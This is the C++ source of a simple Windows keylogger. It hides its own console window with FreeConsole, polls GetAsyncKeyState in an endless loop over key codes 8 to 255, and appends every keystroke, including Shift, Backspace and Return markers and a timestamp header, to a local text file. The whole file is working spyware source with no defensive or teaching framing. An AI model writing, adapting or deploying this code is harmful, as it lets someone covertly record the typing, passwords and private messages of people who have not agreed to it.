// KeyLogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <iostream>
#include <Windows.h> 
#include <ctime>
#include <fstream> 

#define FILE_NAME "key_strokes.txt"

using namespace std;

void LOG(int key, char* file);

char* timeStamp();

//Entry point 
int main()
{

	//Hide the console 
	FreeConsole();

	//Log a time stamp 
	LOG(0x30A7, FILE_NAME);

	while (1) {

		//ASCII characters from index 8 - 255 
		for (int i = 8; i <= 255; i++) {

			//Get key state 
			if (GetAsyncKeyState(i) == -32767) {

				//Log it 
				LOG(i, FILE_NAME);
			}
		}

		Sleep(10);
	}

	return 0;
}

//Write the key out to file 
void LOG(int key, char* file) {

	cout << key << endl;

	//Instantiate a file 
	FILE* log;

	log = fopen(file, "a+");

	//Special key states 
	switch (key) {

	case 0x10:
		fprintf(log, "%s", "[SHIFT]");
		break;

	case 0x08:
		fprintf(log, "%s", "[BACK]");
		break;

	case 0x0D:
		fprintf(log, "%s", "\n[RETURN]");
		break;

	case 0x09:
		fprintf(log, "%s", "    "); 
		break; 

	case 0x30A7:
		fprintf(log, "%s", "\n");
		fprintf(log, "%s", "\n------------");
		fprintf(log, "%s", "\n");
		fprintf(log, "%s", timeStamp());
		fprintf(log, "%s", "------------");
		fprintf(log, "%s", "\n");
		fprintf(log, "%s", "\n");
		break;

	default:
		fprintf(log, "%s", &key);
		break;
	}

	//Close the file 
	fclose(log);
}

//Create a time stamp 
char* timeStamp() {

	//Get the current time 
	time_t current = time(0);

	//Convert to a string 
	char* d_time = ctime(&current);

	return d_time;
}